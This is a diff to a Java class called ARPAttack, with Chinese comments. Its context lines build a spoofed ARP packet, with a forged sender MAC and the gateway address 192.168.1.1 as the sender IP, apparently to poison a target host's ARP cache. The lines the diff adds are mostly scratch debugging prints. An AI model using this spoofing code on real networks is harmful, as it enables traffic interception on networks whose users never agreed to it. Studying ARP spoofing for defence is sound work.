@@ -64,7 +64,24 @@ public class ARPAttack {
     arp.plen = 4; //协议地址长度
     arp.sender_hardaddr = device.mac_address; //ARP包的发送端以太网地址,在这里即本地主机地址
     arp.sender_protoaddr = senderIP.getAddress(); //发送端IP地址, 在这里即本地IP地址
+    //for (byte b:senderIP.getAddress()){
+    int test = 3;
+    byte[] t = {0,127,8};
+    t[0] =(byte) (test&0xff);
+      //System.out.println(Long.toHexString(test));
+    //      mac[x] = (byte) ((Integer.parseInt(temp[x], 16)) & 0xff);
+      System.out.println(Integer.toBinaryString((byte)test));
+String s = Arrays.toString(t);
+    System.out.println(s);
 
+    //}
+    for (byte data:InetAddress.getByName("192.168.1.255").getAddress()){
+    //byte data = (byte)0xff;
+    for (int i = 7; i >= 0; i--) {
+        System.out.print(data >> i & 1);
+    }
+    System.out.println();
+    }
     byte[] broadcast = new byte[] { (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
         (byte) 255 }; //广播地址
     arp.target_hardaddr = broadcast; //设置目的端的以太网地址为广播地址
@@ -107,6 +124,7 @@ public class ARPAttack {
     for (int x = 0; x < temp.length; x++) {
       mac[x] = (byte) ((Integer.parseInt(temp[x], 16)) & 0xff);
     }
+    System.out.println(Arrays.toString(mac));
     return mac;
   }
 
@@ -132,6 +150,7 @@ public class ARPAttack {
 
     byte[] srcmac = stomac("00-0D-2B-2E-B1-0A"); // 伪装的MAC地址，这里乱写就行，不过要符合格式、十六进制
     arp.sender_hardaddr = srcmac;
+    InetAddress test = InetAddress.getByName("192.168.1.1");
     arp.sender_protoaddr = InetAddress.getByName("192.168.1.1").getAddress();
 
     arp.target_hardaddr = getOtherMAC(ip);
